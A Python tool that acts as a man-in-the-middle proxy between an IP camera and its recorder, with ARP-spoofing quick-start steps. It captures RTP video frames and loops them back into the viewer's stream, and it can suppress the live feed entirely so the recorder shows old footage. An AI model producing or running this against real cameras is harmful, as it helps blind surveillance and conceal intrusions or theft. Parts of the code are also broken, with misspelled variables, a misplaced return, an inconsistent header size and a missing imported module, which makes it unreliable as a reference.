#!/usr/bin/env python3
"""
RTSP/TCP MITM Proxy with RTP packet injection.

Home-lab use only — run this on a machine that sits between the camera
and the NVR/viewer (ARP-spoofing or inline bridge).

Architecture
────────────
  Camera ──TCP:554──► MITM (this script) ──TCP:554──► NVR / viewer
                            │
                     records original RTP interleaved frames to a .rtp file
                     and can replay/inject them back into the downstream side.

Two operating modes
───────────────────
  --mode record   : Transparent MITM proxy.  Forwards everything bi-directionally.
                    Simultaneously captures every RTSP interleaved frame ($ CH LEN ...)
                    originating from the *camera side* into --capture-file.
                    Keeps running until Ctrl-C or --capture-frames limit.

  --mode inject   : Transparent MITM proxy.  Once the original stream has been
                    forwarded for --inject-delay seconds (warm-up), it starts
                    interleaving the previously captured frames from --capture-file
                    back into the downstream TCP stream (toward NVR/viewer)
                    in a loop. The real camera stream continues in parallel — the
                    NVR sees both.  Use --inject-only to silence the real stream
                    and inject exclusively the replay frames.

Packet replay details
─────────────────────
  Each captured frame is re-stamped:
    * RTP sequence numbers are incremented from the last live sequence so they
      look sequential to the decoder.
    * RTP timestamps are offset by a configurable delta so the PTS/DTS timeline
      is contiguous (prevents decoder stalls).
    * SSRC is preserved (default) or overwritten with --inject-ssrc.
  Interleaved framing ($ CH LEN) is rebuilt with the correct length.

Capture file format  (.rtp binary)
───────────────────────────────────
  Repeated records:
    4B  big-endian uint32  →  total record length (= 2 + 2 + len(rtp_payload))
    1B  interleaved channel
    1B  reserved = 0
    2B  big-endian uint16  →  len(rtp_payload)
    NB  rtp_payload

Quick-start
───────────
  # 1. ARP-spoof so camera traffic passes through this host
  #    (or use a physical/virtual bridge)

  # 2. Record a loop-able sequence (e.g. 200 frames)
  python rtsp_mitm_injector.py \\
      --mode record \\
      --listen-port 554 \\
      --camera-host 192.168.1.64 --camera-port 554 \\
      --capture-file captured.rtp \\
      --capture-frames 200

  # 3. Inject the captured frames in a loop
  python rtsp_mitm_injector.py \\
      --mode inject \\
      --listen-port 554 \\
      --camera-host 192.168.1.64 --camera-port 554 \\
      --capture-file captured.rtp \\
      --inject-delay 3 \\
      --inject-fps 25

Dependencies: Python ≥ 3.9, no third-party packages required.
"""

from __future__ import annotations

import argparse
import logging
import os
import select
import socket
import struct
import sys
import threading
import time
from pathlib import Path
from typing import List, Optional, Tuple
from rtp_probe import RTPProbe


# ──────────────────────────────────────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.DEBUG,
    format="[%(asctime)s] %(levelname)-7s %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("mitm")


# ──────────────────────────────────────────────────────────────────────────────
# Capture file I/O
# ──────────────────────────────────────────────────────────────────────────────

RECORD_HEADER_FMT = "!IBBHx"  # total_len, channel, reserved, rtp_len, pad
RECORD_HEADER_SIZE = struct.calcsize(RECORD_HEADER_FMT)  # should be 8


def write_captured_frame(fh, channel: int, rtp_payload: bytes):
    """Append one interleaved frame to the capture file."""
    rtp_len = len(rtp_payload)
    total_len = 1 + 1 + 2 + rtp_len  # channel + reserved + len16 + payload
    header = struct.pack("!IBBHx", total_len, channel & 0xFF, 0, rtp_len)
    fh.write(header)
    fh.write(rtp_payload)
    fh.flush()


def read_capture_file(path: Path) -> Tuple[List[Tuple[int, bytes]],dict]:
    """
    Load all captured frames.
    Returns list of (channel, rtp_payload).
    """
    frames: List[Tuple[int, bytes]] = []
    params = {
        'pt': None,
        'ssrc': None,
        'ssrc_hex': None,
        'codec_name': None,
        'fps': 25.0,
    }

    data = path.read_bytes()
    offset = 0
    first_frame = True

    while offset + RECORD_HEADER_SIZE <= len(data):
        total_len, channel, _reserved, rtp_len = struct.unpack_from(
            "!IBBHx", data, offset
        )
        offset += RECORD_HEADER_SIZE
        if offset + rtp_len > len(data):
            log.warning("Capture file truncated at fram %d", len(frames))
            break
        payload = data[offset : offset + rtp_len]
        offset += rtp_len
        frames.append((channel,payload))

        #Extraer parametros del primer frame
        if first_frame and len(payload) >= RTP_HDR_SIZE:
            flags, pt_m, seq, ts, ssrc = struct.unpack_from(RTP_HDR, payload, 0)
            pt = pt_m & 0x7F
            params['pt'] = pt
            params['ssrc'] = ssrc
            params['ssrc_hex'] = f"0x{ssrc:08X}"

            #Intentar identificar el codec por PT
            codec_map = {
                26: "JPEG",
                34: "H263",
                96: "H264",
                97: "H264",
                98: "H265",
                99: "H265",
                100: "MPEG4",
            }
            params['codec_name'] = codec_map.get(pt, f"Unknown(pt={pt})")
            first_frame = False


        #Estimar FPS del archivo (si hay suficientes frames)
        if len(frames) >= 2:
            #Usar timestamps RTP para estimar FPS
            try:
                _, frist_payload = frames[0]
                _, last_payload = frames[-1]
                if len(first_payload) >= RTP_HDR_SIZE and len(last_payload) >= RTP_HDR_SIZE:
                    _, _, _, first_ts, _ = struct.unpack_from(RTP_HDR, first_payload, 0)
                    _, _, _, last_ts, _ = struct.unpack_from(RTP_HDR, last_payload, 0)
                    if last_ts > first_ts:
                        #Asumiendo clock rate de 90000 Hz (comun para video)
                        duration_sec = (last_ts - first_ts) / 90000.0
                        if duration_Sec > 0:
                            params['fps'] = len(frames) / duration_sec

            except:
                pass


        log.info("Loaded %d frames from %s", len(frames), path)
        log.info("Parametros detectados: PT=%s SSRC=%s FPS=%.1f Codec=%s", params['pt'], params['ssrc_hex'], params['fps'], params['codec_name'])

        return frames, params

    


# ──────────────────────────────────────────────────────────────────────────────
# RTP helpers
# ──────────────────────────────────────────────────────────────────────────────

RTP_HDR = "!BBHII"  # flags, PT+M, seq, timestamp, ssrc
RTP_HDR_SIZE = struct.calcsize(RTP_HDR)


def rtp_parse(payload: bytes):
    """Return (flags, pt, seq, ts, ssrc) or None."""
    if len(payload) < RTP_HDR_SIZE:
        return None
    return struct.unpack_from(RTP_HDR, payload, 0)


def rtp_rewrite(payload: bytes, new_seq: int, new_ts: int, new_ssrc: Optional[int] = None) -> bytes:
    """
    Rewrite RTP seq, timestamp (and optionally ssrc) while keeping the rest
    of the header and all extension/padding/payload intact.
    """
    if len(payload) < RTP_HDR_SIZE:
        return payload
    flags, pt_m, _seq, _ts, ssrc = struct.unpack_from(RTP_HDR, payload, 0)
    out_ssrc = new_ssrc if new_ssrc is not None else ssrc
    new_hdr = struct.pack(RTP_HDR, flags, pt_m, new_seq & 0xFFFF, new_ts & 0xFFFFFFFF, out_ssrc)
    return new_hdr + payload[RTP_HDR_SIZE:]


def build_interleaved_frame(channel: int, rtp_payload: bytes) -> bytes:
    """Build the 4-byte RTSP interleaved header + payload."""
    return bytes([0x24, channel & 0xFF]) + struct.pack("!H", len(rtp_payload)) + rtp_payload


# ──────────────────────────────────────────────────────────────────────────────
# Interleaved stream parser (stateful, feed arbitrary TCP chunks)
# ──────────────────────────────────────────────────────────────────────────────

class InterleavedParser:
    """
    Parses the RTSP interleaved format from a raw TCP byte stream.
    Calls on_frame(channel, rtp_payload) for each complete frame.
    Non-interleaved bytes (RTSP text) are passed to on_text(data).
    """

    MAX_FRAME = 1 << 18  # 256 KiB sanity cap

    def __init__(self, on_frame, on_text):
        self._buf = bytearray()
        self._on_frame = on_frame
        self._on_text = on_text

    def feed(self, data: bytes):
        self._buf.extend(data)
        self._drain()

    def _drain(self):
        while self._buf:
            idx = self._buf.find(b"$")
            if idx < 0:
                # No interleaved marker — all text.
                if len(self._buf) > 3:
                    self._on_text(bytes(self._buf[:-3]))
                    del self._buf[:-3]
                return
            if idx > 0:
                self._on_text(bytes(self._buf[:idx]))
                del self._buf[:idx]
            # Need at least 4 bytes for the header.
            if len(self._buf) < 4:
                return
            channel = self._buf[1]
            length = struct.unpack("!H", self._buf[2:4])[0]
            if length < 8 or length > self.MAX_FRAME:
                # False '$' in RTSP text; skip one byte.
                self._on_text(bytes(self._buf[:1]))
                del self._buf[:1]
                continue
            total = 4 + length
            if len(self._buf) < total:
                return
            frame = bytes(self._buf[4:total])
            del self._buf[:total]
            self._on_frame(channel, frame)


# ──────────────────────────────────────────────────────────────────────────────
# Bi-directional TCP forwarder
# ──────────────────────────────────────────────────────────────────────────────

CHUNK = 65536


class MITMProxy:
    """
    Transparent RTSP/TCP MITM proxy.

    client_sock  ←→  (this)  ←→  upstream_sock

    In record mode:
        - All traffic is forwarded untouched.
        - Interleaved frames from upstream (camera→us) are written to capture_fh.

    In inject mode:
        - All traffic is forwarded as in record mode.
        - A background thread loops over the pre-loaded frames and injects them
          into the client_sock (downstream) TCP stream.
        - Injected frames have their RTP seq/ts rewritten to be contiguous.
    """

    def __init__(
        self,
        client_sock: socket.socket,
        camera_host: str,
        camera_port: int,
        args: argparse.Namespace,
        capture_fh=None,
        inject_frames: Optional[List[Tuple[int, bytes]]] = None,
    ):

        self.client_sock = client_sock
        self.camera_host = camera_host
        self.camera_port = camera_port
        self.args = args
        self.probe = RTPProbe(probe_duration=self.args.inject_delay, min_frames=30)
        self.capture_fh = capture_fh
        self.inject_frames = inject_frames or []

        self._stop = threading.Event()
        self._inject_started = threading.Event()
        self._lock = threading.Lock()  # guards writes to client_sock

        # Tracking for injection rewrite
        self._last_live_seq: int = 0
        self._last_live_ts:  int = 0
        self._inject_seq:    int = 0
        self._inject_ts:     int = 0
        self._ts_per_frame:  int = max(1, int(90000 / max(1, args.inject_fps)))

        self.stats = {
            "up_bytes": 0,    # camera → client
            "down_bytes": 0,  # client → camera
            "captured": 0,
            "injected": 0,
        }

    # ──────────────────────────────────────────────────────────────────────────
    # Public entry point
    # ──────────────────────────────────────────────────────────────────────────

    def run(self):
        try:
            upstream = socket.create_connection(
                (self.camera_host, self.camera_port), timeout=10
            )
        except OSError as e:
            log.error("Cannot connect to camera %s:%d — %s", self.camera_host, self.camera_port, e)
            self.client_sock.close()
            return

        log.info("MITM tunnel open: client↔proxy↔camera(%s:%d)", self.camera_host, self.camera_port)

        # Parser for upstream (camera→us) to capture/track RTP
        up_parser = InterleavedParser(
            on_frame=self._on_upstream_frame,
            on_text=lambda _: None,
        )

        if self.inject_frames and self.args.mode == "inject":
            inj_thread = threading.Thread(
                target=self._injection_loop, daemon=True, args=(upstream,)
            )
            inj_thread.start()

        try:
            self._relay_loop(upstream, up_parser)
        finally:
            self._stop.set()
            upstream.close()
            self.client_sock.close()
            log.info(
                "Tunnel closed. up=%dB down=%dB captured=%d injected=%d",
                self.stats["up_bytes"],
                self.stats["down_bytes"],
                self.stats["captured"],
                self.stats["injected"],
            )

    # ──────────────────────────────────────────────────────────────────────────
    # Relay loop (select-based, single thread, handles both directions)
    # ──────────────────────────────────────────────────────────────────────────

    def _relay_loop(self, upstream: socket.socket, up_parser: InterleavedParser):
        client = self.client_sock
        socks = [client, upstream]
        start = time.time()

        while not self._stop.is_set():
            try:
                rlist, _, xlist = select.select(socks, [], socks, 0.5)
            except (ValueError, OSError):
                break

            if xlist:
                log.warning("Socket exception on %s", xlist)
                break

            for sock in rlist:
                try:
                    data = sock.recv(CHUNK)
                except OSError:
                    data = b""
                if not data:
                    log.info("Connection closed by %s", "camera" if sock is upstream else "client")
                    return

                if sock is upstream:
                    # Camera → client: capture & forward
                    up_parser.feed(data)
                    if not self.args.inject_only:
                        self._send_downstream(data)
                    self.stats["up_bytes"] += len(data)
                else:
                    # Client → camera: forward transparently
                    self._send_upstream(upstream, data)
                    self.stats["down_bytes"] += len(data)

            # Signal inject thread to start after warm-up delay.
            if (
                not self._inject_started.is_set()
                and time.time() - start >= self.args.inject_delay
            ):
                self._inject_started.set()
                log.info("Injection warm-up elapsed (%.1fs) — starting replay", self.args.inject_delay)

    # ──────────────────────────────────────────────────────────────────────────
    # Upstream frame callback (camera→us)
    # ──────────────────────────────────────────────────────────────────────────

    def _on_upstream_frame(self, channel: int, rtp_payload: bytes):
        if hasattr(self, "probe") and not self.probe.ready():
            self.probe.feed(channel, rtp_payload)

            if self.probe.ready() and not self._inject_started.is_set():
                params = self.probe.params()

                log.info(
                    "Probe listo → PT=%s SSRC=%s FPS=%s",
                    params["pt"],
                    params["ssrc_hex"],
                    params["fps"],
                )

                self._inject_started.set()


	# Track sequence/timestamp for seamless injection continuity.
        parsed = rtp_parse(rtp_payload)
        if parsed:
            _, _, seq, ts, _ = parsed
            self._last_live_seq = seq
            self._last_live_ts  = ts

        # Record mode: save to file.
        if self.capture_fh is not None:
            write_captured_frame(self.capture_fh, channel, rtp_payload)
            self.stats["captured"] += 1
            limit = self.args.capture_frames
            if limit and self.stats["captured"] >= limit:
                log.info("Capture limit %d reached — stopping capture.", limit)
                self.capture_fh.close()
                self.capture_fh = None

    # ──────────────────────────────────────────────────────────────────────────
    # Injection loop (runs in a daemon thread)
    # ──────────────────────────────────────────────────────────────────────────

    def _injection_loop(self, upstream: socket.socket):
        log.info("Injection thread started — waiting for warm-up signal.")
        self._inject_started.wait()

        if self._stop.is_set():
            return

        frames = self.inject_frames
        if not frames:
            return

        # Seed inject seq/ts from the last live values so the downstream decoder
        # sees a contiguous stream.
        self._inject_seq = (self._last_live_seq + 1) & 0xFFFF
        self._inject_ts  = (self._last_live_ts  + self._ts_per_frame) & 0xFFFFFFFF

        log.info(
            "Injecting %d captured frames in a loop at %.1f fps (ts_step=%d)",
            len(frames), self.args.inject_fps, self._ts_per_frame,
        )

        interval = 1.0 / max(1.0, self.args.inject_fps)
        idx = 0
        inject_ssrc = self.args.inject_ssrc  # None → keep original

        while not self._stop.is_set():
            t0 = time.monotonic()

            channel, original_payload = frames[idx % len(frames)]
            idx += 1

            # Rewrite RTP header fields.
            new_payload = rtp_rewrite(
                original_payload,
                new_seq=self._inject_seq,
                new_ts=self._inject_ts,
                new_ssrc=inject_ssrc,
            )
            self._inject_seq = (self._inject_seq + 1) & 0xFFFF
            self._inject_ts  = (self._inject_ts  + self._ts_per_frame) & 0xFFFFFFFF

            # Build the RTSP interleaved frame and send downstream.
            wire = build_interleaved_frame(channel, new_payload)
            self._send_downstream(wire)
            self.stats["injected"] += 1

            if self.stats["injected"] % 100 == 0:
                log.debug(
                    "Injected %d frames (loop iter %d/%d) seq=%d",
                    self.stats["injected"], idx % len(frames), len(frames),
                    self._inject_seq,
                )

            # Pace to target FPS.
            elapsed = time.monotonic() - t0
            sleep_t = interval - elapsed
            if sleep_t > 0:
                time.sleep(sleep_t)

    # ──────────────────────────────────────────────────────────────────────────
    # Thread-safe send helpers
    # ──────────────────────────────────────────────────────────────────────────

    def _send_downstream(self, data: bytes):
        """Send bytes toward the NVR/viewer (client side)."""
        with self._lock:
            try:
                self.client_sock.sendall(data)
            except OSError as e:
                log.warning("Downstream send error: %s", e)
                self._stop.set()

    def _send_upstream(self, upstream: socket.socket, data: bytes):
        """Send bytes toward the camera."""
        try:
            upstream.sendall(data)
        except OSError as e:
            log.warning("Upstream send error: %s", e)
            self._stop.set()


# ──────────────────────────────────────────────────────────────────────────────
# Listener / accept loop
# ──────────────────────────────────────────────────────────────────────────────

def serve(args: argparse.Namespace):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.bind, args.listen_port))
    server.listen(5)
    log.info(
        "MITM listening on %s:%d — forwarding to camera %s:%d  [mode=%s]",
        args.bind, args.listen_port,
        args.camera_host, args.camera_port,
        args.mode,
    )

    # Pre-load capture frames for inject mode.
    inject_frames: Optional[List[Tuple[int, bytes]]] = None
    if args.mode == "inject":
        p = Path(args.capture_file)
        if not p.exists():
            log.error("Capture file not found: %s", p)
            sys.exit(1)
        inject_frames, capture_params = read_capture_file(p)
        if not inject_frames:
            log.error("No frames loaded from capture file.")
            sys.exit(1)

        #Autodeteccion
        if capture_params and capture_params.get('pt') is not None:
            if not hasattr(args, 'pt') or args.pt is None:
                args.pt = capture_params['pt']
                log.info(f"[OK] PT auto-detected from capture file: {args.pt}")

            if args.inject_ssrc is None and capture_params.get('ssrc') is not None:
                args.inject_ssrc = capture_params['ssrc']
                log.info(f"[OK] SSRC auto-detected from capture file: {args.inject_ssrc:08X}")

            if args.inject_fps is None and capture_params.get('fps') is not None:
                #Solo sobrescribe si es el valor por defectp
                args.inject_fps = capture_params['fps']
                log.info(f"[OK] FPS auto-detected from capture file: {args.inject_fps:.1f}")


    session_n = 0
    try:
        while True:
            client_sock, addr = server.accept()
            session_n += 1
            log.info("New connection from %s (session #%d)", addr, session_n)

            # Open capture file for this session in record mode.
            capture_fh = None
            if args.mode == "record":
                cap_path = Path(args.capture_file)
                if session_n > 1:
                    # Append session number to avoid overwriting.
                    cap_path = cap_path.with_name(
                        f"{cap_path.stem}_s{session_n}{cap_path.suffix}"
                    )
                capture_fh = open(cap_path, "ab", buffering=0)
                log.info("Capturing to %s", cap_path)

            proxy = MITMProxy(
                client_sock=client_sock,
                camera_host=args.camera_host,
                camera_port=args.camera_port,
                args=args,
                capture_fh=capture_fh,
                inject_frames=inject_frames,
            )
            t = threading.Thread(target=proxy.run, daemon=True)
            t.start()
    except KeyboardInterrupt:
        log.info("Shutting down.")
    finally:
        server.close()


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def parse_args():
    ap = argparse.ArgumentParser(
        description="RTSP/TCP MITM proxy — record and inject interleaved RTP frames.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    ap.add_argument(
        "--mode",
        choices=["record", "inject"],
        required=True,
        help="record: transparent proxy + capture  |  inject: transparent proxy + frame replay",
    )

    # Network
    ap.add_argument("--bind",        default="0.0.0.0",  help="IP to listen on (default: 0.0.0.0)")
    ap.add_argument("--listen-port", type=int, default=554, help="TCP port to listen on (default: 554)")
    ap.add_argument("--camera-host", required=True,       help="Camera IP / hostname")
    ap.add_argument("--camera-port", type=int, default=554, help="Camera RTSP port (default: 554)")

    # Capture
    ap.add_argument("--capture-file",   default="captured.rtp", help="Binary capture file path")
    ap.add_argument("--capture-frames", type=int, default=0,
                    help="Stop capturing after N frames (0 = unlimited)")

    # Injection
    ap.add_argument("--inject-delay",   type=float, default=3.0,
                    help="Seconds to wait before starting injection (warm-up, default: 3)")
    ap.add_argument("--inject-fps",     type=float, default=25.0,
                    help="Target injection frame-rate (default: 25)")
    ap.add_argument("--inject-ssrc",    type=lambda v: int(v, 0), default=None,
                    help="Override SSRC in injected frames, e.g. 0xdeadbeef (default: keep original)")
    ap.add_argument("--inject-only",    action="store_true",
                    help="In inject mode, suppress the real camera stream; send only injected frames downstream.")
    ap.add_argument("--pt", type=int, default=None,
                    help="RTP Payload Type to use for injection (auto-detect if not specified)")

    # Misc
    ap.add_argument("--log-level", default="INFO",
                    choices=["DEBUG", "INFO", "WARNING", "ERROR"])

    return ap.parse_args()


def main():
    args = parse_args()
    logging.getLogger().setLevel(args.log_level)

    # Sanity checks
    if args.mode == "inject" and not args.capture_file:
        log.error("--capture-file is required in inject mode.")
        sys.exit(1)

    serve(args)


if __name__ == "__main__":
    main()
